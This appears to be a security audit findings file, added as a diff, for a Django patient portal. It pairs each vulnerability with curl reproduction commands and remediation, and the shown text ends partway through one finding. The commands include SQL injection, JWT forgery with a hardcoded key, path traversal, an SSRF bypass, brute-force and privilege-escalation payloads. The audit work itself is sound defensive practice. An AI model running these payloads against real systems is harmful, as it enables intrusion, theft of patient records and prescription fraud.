@@ -1,0 +1,801 @@
+{
+  "target": "medicare",
+  "version": 2,
+  "verified_by": "Samuel Joseph",
+  "verified_date": "2026-08-26",
+  "findings_count": 28,
+  "severity_breakdown": {"critical": 5, "high": 8, "medium": 11, "low": 4},
+  "vulnerabilities": [
+    {
+      "id": "C-01",
+      "title": "Mass assignment via profile endpoint leads to admin role self-elevation",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "cwe": ["CWE-915", "CWE-269"],
+      "cwe_primary": "CWE-915",
+      "vuln_class": "mass_assignment",
+      "owasp": "A01:2021",
+      "method": "PUT",
+      "endpoint": "/api/auth/profile/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "auth_app/serializers.py:8,21-22 ; views.py:130-141",
+      "affected_endpoint": "PUT /api/auth/profile/",
+      "auth_required": true,
+      "description": "_USER_EDITABLE_FIELDS includes 'role' and 'is_active'. UserProfileSerializer does not mark role as read_only, so any authenticated user can PUT {\"role\":\"admin\"} to self-promote. UserSerializer:15 does protect role, and SignupSerializer doesn't expose it — the hole exists only in the self-service profile path.",
+      "impact": "Full vertical privilege escalation from lowest staff role to administrator in a single PUT. Attacker can then list/create/delete every user, list every patient, and read every uploaded lab artifact.",
+      "reproduction": {
+        "steps": [
+          "Login as user@app.local",
+          "PUT /api/auth/profile/ with body {\"name\":\"Regular User\",\"role\":\"admin\"}",
+          "GET /api/auth/profile/ confirms role is now 'admin'",
+          "GET /api/admin/users/ now returns full user list (was 403 before)"
+        ],
+        "curl": "curl -s -X PUT http://localhost:18001/api/auth/profile/ -H \"Authorization: Bearer $TOK\" -H 'Content-Type: application/json' -d '{\"name\":\"Regular User\",\"role\":\"admin\"}'"
+      },
+      "remediation": "Drop 'role' and 'is_active' from _USER_EDITABLE_FIELDS. Re-add 'role' to UserProfileSerializer.read_only_fields."
+    },
+    {
+      "id": "C-02",
+      "title": "SQL injection in ORDER BY clause via sort parameter",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "cwe": ["CWE-89"],
+      "cwe_primary": "CWE-89",
+      "vuln_class": "sqli",
+      "owasp": "A03:2021",
+      "method": "GET",
+      "endpoint": "/api/patients/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/views.py:41-49",
+      "affected_endpoint": "GET /api/patients/?sort=",
+      "auth_required": true,
+      "description": "The WHERE clause is parameterized but the ORDER BY uses a raw f-string with the user-supplied sort parameter. Stacked statements are blocked by sqlite3 driver but subselects execute freely. Verified: boolean oracle exfiltrated admin password hash prefix 'pbkdf2_sha256$600000$SALT'.",
+      "impact": "Authenticated full-database read. PBKDF2 password hashes, email reset tokens, refill records, and lab metadata extractable via boolean-blind oracle.",
+      "reproduction": {
+        "steps": [
+          "Login as user@app.local",
+          "GET /api/patients/?sort=(CASE WHEN (SELECT substr(password,1,1) FROM auth_app_customuser WHERE email='admin@app.local')='p' THEN name ELSE condition END)",
+          "Response order changes based on truth of the condition"
+        ],
+        "curl": "curl -s -G -H \"Authorization: Bearer $TOK\" --data-urlencode \"sort=(CASE WHEN (SELECT substr(password,1,1) FROM auth_app_customuser WHERE email='admin@app.local')='p' THEN name ELSE condition END)\" http://localhost:18001/api/patients/"
+      },
+      "remediation": "Replace raw SQL ORDER BY with a server-side allowlist mapping sort values to safe SQL expressions. Prefer ORM qs.order_by()."
+    },
+    {
+      "id": "C-03",
+      "title": "Path traversal via lab upload filename leads to arbitrary file write and RCE",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "cwe": ["CWE-22", "CWE-434"],
+      "cwe_primary": "CWE-22",
+      "vuln_class": "path_traversal",
+      "owasp": "A01:2021",
+      "method": "POST",
+      "endpoint": "/api/patients/{id}/lab-results/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/lab_import_views.py:79-92,108-111",
+      "affected_endpoint": "POST /api/patients/{id}/lab-results/",
+      "auth_required": true,
+      "description": "The multipart filename form field overrides the real upload name and is joined via os.path.join unvalidated. Both relative traversal (../../../../etc/cron.d/pwn) and absolute path (/etc/passwd) work. No extension allowlist — .py, .sh, .html all accepted. Overwriting any .py under /app/backend yields code execution on next reload (runserver auto-reloads). Container runs as root, so write is unconstrained.",
+      "impact": "Arbitrary file write to entire container filesystem. Combined with runserver auto-reload (M-06) and root container (M-09), this is same-second remote code execution.",
+      "reproduction": {
+        "steps": [
+          "Login as any user",
+          "POST /api/patients/3/lab-results/ with file=@labs.csv and form field filename=../../pwn-traversal.txt",
+          "File lands at /app/backend/media/pwn-traversal.txt instead of per-patient directory"
+        ],
+        "curl": "curl -s -X POST -H \"Authorization: Bearer $TOK\" -F 'file=@/tmp/pwn.csv;filename=labs.csv' -F 'filename=../../pwn-traversal.txt' http://localhost:18001/api/patients/3/lab-results/"
+      },
+      "remediation": "Validate filename against a safe pattern (^[A-Za-z0-9._-]{1,128}$). After joining, verify with os.path.realpath that it remains under the base directory."
+    },
+    {
+      "id": "C-04",
+      "title": "Server-side request forgery with full response reflection (blocklist bypass)",
+      "severity": "Critical",
+      "cvss_score": 9.1,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
+      "cwe": ["CWE-918"],
+      "cwe_primary": "CWE-918",
+      "vuln_class": "ssrf",
+      "owasp": "A10:2021",
+      "method": "GET",
+      "endpoint": "/api/patients/{id}/verify-insurance/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/insurance_views.py:16-24,48,55-62",
+      "affected_endpoint": "GET /api/patients/{id}/verify-insurance/?payer_url=",
+      "auth_required": true,
+      "description": "Two-string substring blocklist ('localhost', '127.0.0.1') trivially bypassed via 127.1, 0.0.0.0, [::1], decimal encoding, internal service names. Redirects not re-validated. 800 bytes of response body reflected — full-read SSRF, not blind.",
+      "impact": "Full-read SSRF. In cloud: IMDS credential exfiltration. In Kubernetes: service-account token theft. On-prem: reach any internal service. Response body returned directly.",
+      "reproduction": {
+        "steps": [
+          "Login as any user",
+          "GET /api/patients/1/verify-insurance/?payer_url=http://localhost:8001/api/health/ — blocked",
+          "GET /api/patients/1/verify-insurance/?payer_url=http://127.1:8001/api/health/ — bypassed, returns internal response"
+        ],
+        "curl": "curl -s -H \"Authorization: Bearer $TOK\" \"http://localhost:18001/api/patients/1/verify-insurance/?payer_url=http://127.1:8001/api/health/\""
+      },
+      "remediation": "Replace blocklist with allowlist of approved payer hostnames. Resolve DNS and verify IP is not loopback/private/link-local before fetching. Pin resolved IP to prevent DNS rebinding."
+    },
+    {
+      "id": "C-05",
+      "title": "Hardcoded SECRET_KEY enables JWT forgery and full auth bypass",
+      "severity": "Critical",
+      "cvss_score": 9.8,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "cwe": ["CWE-798", "CWE-321"],
+      "cwe_primary": "CWE-798",
+      "vuln_class": "hardcoded_credentials",
+      "owasp": "A02:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "medicare/settings.py:7",
+      "affected_endpoint": "All endpoints (JWT authentication bypass)",
+      "auth_required": false,
+      "description": "SECRET_KEY defaults to 'medicare-portal-dev-secret-2024' when DJANGO_SECRET_KEY env var not set. SimpleJWT uses SECRET_KEY as SIGNING_KEY with HS256. Anyone who knows the key can mint valid access tokens for any user_id without login.",
+      "impact": "Unauthenticated remote takeover. Forged user_id=1 token grants full admin access to every endpoint, patient record, lab artifact, and refill row.",
+      "reproduction": {
+        "steps": [
+          "Generate JWT with payload {\"token_type\":\"access\",\"user_id\":1} signed with 'medicare-portal-dev-secret-2024' using HS256",
+          "Use forged token: GET /api/admin/users/ returns full user list"
+        ],
+        "curl": "python3 -c \"import jwt,time; print(jwt.encode({'token_type':'access','exp':int(time.time())+3600,'iat':int(time.time()),'jti':'forged','user_id':1},'medicare-portal-dev-secret-2024',algorithm='HS256'))\" | xargs -I{} curl -s -H 'Authorization: Bearer {}' http://localhost:18001/api/admin/users/"
+      },
+      "remediation": "Fail-closed: use os.environ['DJANGO_SECRET_KEY'] (raises KeyError if missing). Set SIMPLE_JWT SIGNING_KEY to a dedicated env var."
+    },
+    {
+      "id": "H-01",
+      "title": "Broken object-level authorization (IDOR/BOLA) on 5 patient endpoints",
+      "severity": "High",
+      "cvss_score": 8.2,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+      "cwe": ["CWE-639", "CWE-862"],
+      "cwe_primary": "CWE-639",
+      "vuln_class": "idor",
+      "owasp": "A01:2021",
+      "method": "GET",
+      "endpoint": "/api/patients/{id}/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/views.py:85,106 ; refill_views.py:37 ; lab_import_views.py:61 ; insurance_views.py:29",
+      "affected_endpoint": "GET /api/patients/{id}/, GET /api/patients/search/, GET|POST /api/patients/{id}/refill-requests/, GET|POST /api/patients/{id}/lab-results/, GET /api/patients/{id}/verify-insurance/",
+      "auth_required": true,
+      "description": "Only patients_list_create filters by created_by. Every other patient-scoped endpoint fetches by primary key with no ownership check: patient detail, patient search (no filter at all — empty ?name= returns entire table), refill requests, lab results, and insurance verification. A newly signed-up account enumerates all patient records via /api/patients/search/?name= with empty parameter.",
+      "impact": "PHI disclosure for entire patient population (name, DOB, condition, doctor, refill history, lab results). Direct HIPAA 164.312(a)(1) failure.",
+      "reproduction": {
+        "steps": [
+          "Login as user@app.local (low-privilege user)",
+          "GET /api/patients/ returns only the user's own patients",
+          "GET /api/patients/1/ through /api/patients/8/ returns ALL patients",
+          "GET /api/patients/search/?name= returns the entire patient table"
+        ],
+        "curl": "curl -s -H \"Authorization: Bearer $TOK\" http://localhost:18001/api/patients/1/"
+      },
+      "remediation": "Apply ownership check on all patient-scoped endpoints: if request.user.role != 'admin' and patient.created_by_id != request.user.id, return 403."
+    },
+    {
+      "id": "H-02",
+      "title": "Business logic bypass — self-approved prescription refills via client-trusted fields",
+      "severity": "High",
+      "cvss_score": 8.1,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:H",
+      "cwe": ["CWE-602", "CWE-840", "CWE-863"],
+      "cwe_primary": "CWE-602",
+      "vuln_class": "business_logic",
+      "owasp": "A04:2021",
+      "method": "POST",
+      "endpoint": "/api/patients/{id}/refill-requests/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/refill_views.py:50,59-70 ; serializers.py:60-61",
+      "affected_endpoint": "POST /api/patients/{id}/refill-requests/",
+      "auth_required": true,
+      "description": "Two independent bypasses: (1) doctor_approved is bool(request.data.get('doctor_approved')) from client body — no check caller is a doctor (no doctor role exists); (2) last_filled is client-supplied and never validated against stored history, so backdating triggers auto-approval. Serializer read_only_fields protects status and auto_approved but omits doctor_approved.",
+      "impact": "Any account approves controlled-substance refills for any patient. Combined with H-01 IDOR, pharmaceutical-workflow fraud at scale. Patient-safety impact.",
+      "reproduction": {
+        "steps": [
+          "Login as user@app.local",
+          "POST /api/patients/3/refill-requests/ with {\"medication\":\"oxycodone-10mg\",\"dosage\":\"30 tablets\",\"last_filled\":\"2024-01-01\",\"doctor_approved\":false}",
+          "Response: {\"status\":\"approved\",\"auto_approved\":true}"
+        ],
+        "curl": "curl -s -X POST -H \"Authorization: Bearer $TOK\" -H 'Content-Type: application/json' http://localhost:18001/api/patients/3/refill-requests/ -d '{\"medication\":\"oxycodone-10mg\",\"dosage\":\"30 tablets\",\"last_filled\":\"2024-01-01\",\"doctor_approved\":false}'"
+      },
+      "remediation": "Compute days_since_last_fill from the most recent PrescriptionRefill row, not client-supplied date. Remove doctor_approved from client-accepted fields."
+    },
+    {
+      "id": "H-03",
+      "title": "DEBUG = True by default exposes full stack traces and configuration",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-489", "CWE-215"],
+      "cwe_primary": "CWE-489",
+      "vuln_class": "information_disclosure",
+      "owasp": "A05:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "medicare/settings.py:9",
+      "affected_endpoint": "All endpoints (error responses)",
+      "auth_required": false,
+      "description": "os.environ.get('DJANGO_DEBUG', 'true') defaults to True. Unhandled exceptions render Django's technical 500 page: full traceback, local variables, all settings including SECRET_KEY and DB credentials, installed apps, SQL history. Also enables the media file server (H-05).",
+      "impact": "Information disclosure of internal application structure, database schema, file paths, configuration, and SECRET_KEY. Chains into C-05 for full auth bypass.",
+      "reproduction": {
+        "steps": [
+          "GET /api/nonexistent/ returns detailed debug page with URL configuration",
+          "Trigger a 500 — Django returns full stack trace with local variables including SECRET_KEY"
+        ],
+        "curl": "curl -s http://localhost:18001/api/nonexistent/"
+      },
+      "remediation": "Set DEBUG default to false: DEBUG = os.environ.get('DJANGO_DEBUG', 'false').lower() == 'true'."
+    },
+    {
+      "id": "H-04",
+      "title": "Unhandled ValidationError in password reset exposes debug page pre-auth",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-248", "CWE-209"],
+      "cwe_primary": "CWE-248",
+      "vuln_class": "information_disclosure",
+      "owasp": "A05:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/reset-password/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "auth_app/views.py:96-98",
+      "affected_endpoint": "POST /api/auth/reset-password/",
+      "auth_required": false,
+      "description": "except clause catches (PasswordResetToken.DoesNotExist, ValueError) but malformed token causes UUIDField.to_python to raise django.core.exceptions.ValidationError — not caught. Returns 500 debug page with SECRET_KEY to unauthenticated attacker.",
+      "impact": "Pre-auth information disclosure. Chains directly into C-05: leaked SECRET_KEY enables JWT forgery for full admin access. Single malformed POST extracts all sensitive configuration.",
+      "reproduction": {
+        "steps": [
+          "POST /api/auth/reset-password/ with {\"token\":\"x\",\"password\":\"aaaaaa\",\"confirm_password\":\"aaaaaa\"}",
+          "Server returns 500 with full Django debug page including SECRET_KEY"
+        ],
+        "curl": "curl -s -X POST http://localhost:18001/api/auth/reset-password/ -H 'Content-Type: application/json' -d '{\"token\":\"x\",\"password\":\"aaaaaa\",\"confirm_password\":\"aaaaaa\"}'"
+      },
+      "remediation": "Add django.core.exceptions.ValidationError to the except clause."
+    },
+    {
+      "id": "H-05",
+      "title": "Unrestricted upload served same-origin enables stored XSS",
+      "severity": "High",
+      "cvss_score": 8.1,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N",
+      "cwe": ["CWE-434", "CWE-79"],
+      "cwe_primary": "CWE-434",
+      "vuln_class": "unrestricted_upload",
+      "owasp": "A03:2021",
+      "method": "POST",
+      "endpoint": "/api/patients/{id}/lab-results/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/lab_import_views.py ; medicare/urls.py:71",
+      "affected_endpoint": "POST /api/patients/{id}/lab-results/ + GET /media/lab_results/{id}/{file}",
+      "auth_required": true,
+      "description": "No content-type validation, no extension allowlist, no magic-byte check — accept='.csv,.xml' on LabImport.jsx:74 is cosmetic. Upload evil.html or evil.svg, then fetch /media/lab_results/<id>/evil.html; Django's static server sets Content-Type from extension and browser executes it on the app's origin. JWTs live in localStorage (M-02), so one visit is full account takeover.",
+      "impact": "Stored XSS leading to full account takeover for any user who views the uploaded file. Admin users viewing dashboards are especially vulnerable.",
+      "reproduction": {
+        "steps": [
+          "Login as any user",
+          "Upload evil.html via POST /api/patients/1/lab-results/",
+          "GET /media/lab_results/1/evil.html — browser executes the script on app origin"
+        ],
+        "curl": "curl -s -X POST -H \"Authorization: Bearer $TOK\" -F 'file=@evil.html' http://localhost:18001/api/patients/1/lab-results/"
+      },
+      "remediation": "Validate file extension against allowlist (csv, pdf, hl7, txt). Check magic bytes. Serve uploaded files with Content-Disposition: attachment and X-Content-Type-Options: nosniff."
+    },
+    {
+      "id": "H-06",
+      "title": "No rate limiting or brute-force protection anywhere",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-307", "CWE-799"],
+      "cwe_primary": "CWE-307",
+      "vuln_class": "brute_force",
+      "owasp": "A07:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/login/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "Entire backend (no throttles)",
+      "affected_endpoint": "POST /api/auth/login/, POST /api/auth/signup/, POST /api/auth/forgot-password/",
+      "auth_required": false,
+      "description": "Zero results for throttle|ratelimit grep across backend. REST_FRAMEWORK sets no DEFAULT_THROTTLE_CLASSES. No lockout, CAPTCHA, or failed-attempt counter on login, forgot-password, or signup. forgot-password doubles as email-bomb relay.",
+      "impact": "Online credential guessing trivially effective with no password validators (H-08). Unlimited login attempts at maximum speed for brute force or credential stuffing.",
+      "reproduction": {
+        "steps": [
+          "Send 1000 POST /api/auth/login/ requests with different passwords in rapid succession",
+          "No requests are blocked, delayed, or rate-limited"
+        ],
+        "curl": "for i in $(seq 1 100); do curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:18001/api/auth/login/ -H 'Content-Type: application/json' -d '{\"email\":\"admin@app.local\",\"password\":\"wrong'$i'\"}'; done"
+      },
+      "remediation": "Add DRF throttling via DEFAULT_THROTTLE_CLASSES (5/min for login). Use django-axes for account lockout."
+    },
+    {
+      "id": "H-07",
+      "title": "Default credentials seeded and displayed on login page",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-798", "CWE-1392"],
+      "cwe_primary": "CWE-798",
+      "vuln_class": "hardcoded_credentials",
+      "owasp": "A07:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "seed.py:40,52,64 ; Login.jsx:84-88",
+      "affected_endpoint": "All endpoints (default credentials grant access)",
+      "auth_required": false,
+      "description": "seed.py seeds admin@app.local/Admin@123, user@app.local/User@123, nurse@app.local/Nurse@123 on every container start. Login.jsx renders these credentials on the login page to every unauthenticated visitor.",
+      "impact": "Full admin access to any deployment using default credentials. Zero effort required — credentials publicly visible on login page.",
+      "reproduction": {
+        "steps": [
+          "Navigate to login page — credentials displayed in UI",
+          "Login with admin@app.local / Admin@123 — full admin access"
+        ],
+        "curl": "curl -s -X POST http://localhost:18001/api/auth/login/ -H 'Content-Type: application/json' -d '{\"email\":\"admin@app.local\",\"password\":\"Admin@123\"}'"
+      },
+      "remediation": "Remove credential display from Login.jsx. Generate random passwords in seed.py, print only to container logs on first run."
+    },
+    {
+      "id": "H-08",
+      "title": "No password policy — AUTH_PASSWORD_VALIDATORS empty",
+      "severity": "High",
+      "cvss_score": 7.5,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-521"],
+      "cwe_primary": "CWE-521",
+      "vuln_class": "weak_password",
+      "owasp": "A07:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/signup/",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "medicare/settings.py:80",
+      "affected_endpoint": "POST /api/auth/signup/, POST /api/auth/reset-password/",
+      "auth_required": false,
+      "description": "AUTH_PASSWORD_VALIDATORS = [] disables all four Django default validators (length, common-password, numeric, similarity). Only constraint is min_length=6 on serializer. '123456' and 'password' are accepted.",
+      "impact": "Weak passwords trivially cracked via brute force (H-06) or dictionary attack. Combined with no rate limiting, accounts compromised in seconds.",
+      "reproduction": {
+        "steps": [
+          "POST /api/auth/signup/ with password='123456' — account created successfully",
+          "POST /api/auth/signup/ with password='aaaaaa' — account created successfully"
+        ],
+        "curl": "curl -s -X POST http://localhost:18001/api/auth/signup/ -H 'Content-Type: application/json' -d '{\"email\":\"weak@test.com\",\"name\":\"test\",\"password\":\"123456\",\"confirm_password\":\"123456\"}'"
+      },
+      "remediation": "Restore Django default AUTH_PASSWORD_VALIDATORS: MinimumLengthValidator (8+), CommonPasswordValidator, NumericPasswordValidator, UserAttributeSimilarityValidator."
+    },
+    {
+      "id": "M-01",
+      "title": "Broken session termination with 24-hour access token lifetime",
+      "severity": "Medium",
+      "cvss_score": 6.5,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+      "cwe": ["CWE-613", "CWE-384"],
+      "cwe_primary": "CWE-613",
+      "vuln_class": "session_management",
+      "owasp": "A07:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/logout/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "settings.py:119 ; auth_app/views.py:118-127",
+      "affected_endpoint": "POST /api/auth/logout/",
+      "auth_required": true,
+      "description": "Logout blacklists only the refresh token. The access token (24h lifetime) remains valid for its full remaining lifetime. Password reset also doesn't invalidate outstanding tokens — stolen token survives victim's remediation.",
+      "impact": "Session hijacking persistence. Stolen access token usable for up to 24 hours after logout. User has no way to force-revoke stolen session.",
+      "reproduction": {
+        "steps": [
+          "Login and capture access token",
+          "Logout via POST /api/auth/logout/ with refresh token",
+          "Continue using access token — GET /api/auth/profile/ still returns 200"
+        ],
+        "curl": "curl -s -H \"Authorization: Bearer $OLD_ACCESS_TOK\" http://localhost:18001/api/auth/profile/"
+      },
+      "remediation": "Reduce ACCESS_TOKEN_LIFETIME to 5-15 minutes. Implement token blacklist check on every request."
+    },
+    {
+      "id": "M-02",
+      "title": "JWTs stored in localStorage — accessible to any XSS",
+      "severity": "Medium",
+      "cvss_score": 5.4,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-522", "CWE-1004"],
+      "cwe_primary": "CWE-522",
+      "vuln_class": "insecure_storage",
+      "owasp": "A02:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "client.js:12,31 ; App.jsx:112-114",
+      "affected_endpoint": "All endpoints (client-side token handling)",
+      "auth_required": false,
+      "description": "Access + refresh tokens in localStorage, readable by any JavaScript on the origin. No HttpOnly, no Secure, no SameSite. Turns H-05 into full account takeover.",
+      "impact": "Any XSS on the origin can exfiltrate both tokens. 24-hour access token lifetime (M-01) extends the window.",
+      "reproduction": {
+        "steps": [
+          "Login to the application",
+          "Browser console: localStorage.getItem('access_token') returns the JWT"
+        ],
+        "curl": "N/A — client-side vulnerability"
+      },
+      "remediation": "Store tokens in HttpOnly, Secure, SameSite=Strict cookies. Use BFF pattern to keep tokens server-side."
+    },
+    {
+      "id": "M-03",
+      "title": "Internal filesystem path disclosure via stored_path API field",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+      "cwe": ["CWE-200"],
+      "cwe_primary": "CWE-200",
+      "vuln_class": "information_disclosure",
+      "owasp": "A01:2021",
+      "method": "GET",
+      "endpoint": "/api/patients/{id}/lab-results/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "patients/serializers.py:75",
+      "affected_endpoint": "GET /api/patients/{id}/lab-results/",
+      "auth_required": true,
+      "description": "LabResultSerializer exposes stored_path — the absolute server path (/app/backend/media/lab_results/3/CBC.csv). read_only_fields = fields means it's returned to every authenticated caller. Hands attacker exact directory layout to aim C-03.",
+      "impact": "Reveals internal directory structure. Provides the exact path layout needed to aim the path traversal attack (C-03) precisely.",
+      "reproduction": {
+        "steps": [
+          "Login as any user",
+          "GET /api/patients/1/lab-results/ — response includes stored_path with absolute server paths"
+        ],
+        "curl": "curl -s -H \"Authorization: Bearer $TOK\" http://localhost:18001/api/patients/1/lab-results/"
+      },
+      "remediation": "Remove stored_path from LabResultSerializer.fields. Expose a signed download endpoint instead."
+    },
+    {
+      "id": "M-04",
+      "title": "ALLOWED_HOSTS = ['*'] enables host header injection",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+      "cwe": ["CWE-16", "CWE-644"],
+      "cwe_primary": "CWE-644",
+      "vuln_class": "misconfiguration",
+      "owasp": "A05:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "medicare/settings.py:10",
+      "affected_endpoint": "All endpoints (Host header handling)",
+      "auth_required": false,
+      "description": "ALLOWED_HOSTS = ['*'] disables Host header validation. Enables host-header injection, web-cache poisoning, and password-reset-link poisoning in any deployment deriving URLs from the request.",
+      "impact": "Password-reset-link poisoning: attacker injects malicious Host header, reset link points to attacker domain. Web-cache poisoning in cached deployments.",
+      "reproduction": {
+        "steps": [
+          "Send any request with Host: evil.com — Django accepts without error"
+        ],
+        "curl": "curl -s -H 'Host: evil.com' http://localhost:18001/api/health/"
+      },
+      "remediation": "Set ALLOWED_HOSTS to specific hostnames."
+    },
+    {
+      "id": "M-05",
+      "title": "User enumeration via differential signup error message",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "cwe": ["CWE-204"],
+      "cwe_primary": "CWE-204",
+      "vuln_class": "user_enumeration",
+      "owasp": "A07:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/signup/",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "auth_app/serializers.py:25-31 ; Signup.jsx:57-60",
+      "affected_endpoint": "POST /api/auth/signup/",
+      "auth_required": false,
+      "description": "SignupSerializer inherits DRF's UniqueValidator on email, returning 'custom user with this email already exists' verbatim via Signup.jsx. forgot_password_view carefully avoids this leak, so protection is inconsistent and defeated.",
+      "impact": "Email enumeration at scale. Confirmed accounts targeted with brute-force (H-06) or phishing.",
+      "reproduction": {
+        "steps": [
+          "POST /api/auth/signup/ with email=admin@app.local — returns 400 with 'already exists'",
+          "POST /api/auth/signup/ with email=nonexistent@test.com — returns different error or 201"
+        ],
+        "curl": "curl -s -X POST http://localhost:18001/api/auth/signup/ -H 'Content-Type: application/json' -d '{\"email\":\"admin@app.local\",\"name\":\"test\",\"password\":\"Test@123\",\"confirm_password\":\"Test@123\"}'"
+      },
+      "remediation": "Return generic message for all signup failures. Use two-step signup with email verification."
+    },
+    {
+      "id": "M-06",
+      "title": "Django development server (runserver) as production entrypoint",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+      "cwe": ["CWE-16"],
+      "cwe_primary": "CWE-16",
+      "vuln_class": "misconfiguration",
+      "owasp": "A05:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "backend/entrypoint.sh:7,17",
+      "affected_endpoint": "All endpoints (server configuration)",
+      "auth_required": false,
+      "description": "entrypoint.sh:17 uses 'python manage.py runserver 0.0.0.0:8001'. Single-threaded, no hardening, auto-reloads on file change (makes C-03 same-second RCE), serves static files insecurely. Line 7 runs makemigrations at container start, risking schema drift.",
+      "impact": "Auto-reload turns path traversal (C-03) into same-second RCE. Single-threaded serving enables trivial DoS.",
+      "reproduction": {
+        "steps": [
+          "Inspect entrypoint.sh — line 17 shows 'exec python manage.py runserver 0.0.0.0:8001'"
+        ],
+        "curl": "N/A — configuration issue"
+      },
+      "remediation": "Use gunicorn or uvicorn. Remove makemigrations from entrypoint."
+    },
+    {
+      "id": "M-07",
+      "title": "Missing HSTS, SSL redirect, secure cookies, and CSP headers",
+      "severity": "Medium",
+      "cvss_score": 5.4,
+      "cvss_vector": "AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N",
+      "cwe": ["CWE-319", "CWE-693"],
+      "cwe_primary": "CWE-319",
+      "vuln_class": "transport_security",
+      "owasp": "A05:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "medicare/settings.py",
+      "affected_endpoint": "All endpoints (HTTP response headers)",
+      "auth_required": false,
+      "description": "None of SECURE_SSL_REDIRECT, SECURE_HSTS_SECONDS, SECURE_HSTS_INCLUDE_SUBDOMAINS, SESSION_COOKIE_SECURE, CSRF_COOKIE_SECURE, SECURE_REFERRER_POLICY, or Content-Security-Policy are set. PHI transported over plaintext HTTP with no CSP to blunt H-05.",
+      "impact": "MitM attacks can downgrade HTTPS to HTTP. XSS attacks unrestricted without CSP. Session cookies transmitted over unencrypted connections.",
+      "reproduction": {
+        "steps": [
+          "Make any request — no Strict-Transport-Security or Content-Security-Policy headers present"
+        ],
+        "curl": "curl -sI http://localhost:18001/api/health/ | grep -iE 'strict|content-security'"
+      },
+      "remediation": "Add SECURE_HSTS_SECONDS = 31536000, SESSION_COOKIE_SECURE = True, CSRF_COOKIE_SECURE = True. Install django-csp."
+    },
+    {
+      "id": "M-08",
+      "title": "Cleartext SMTP transmits password reset tokens unencrypted",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+      "cwe": ["CWE-319"],
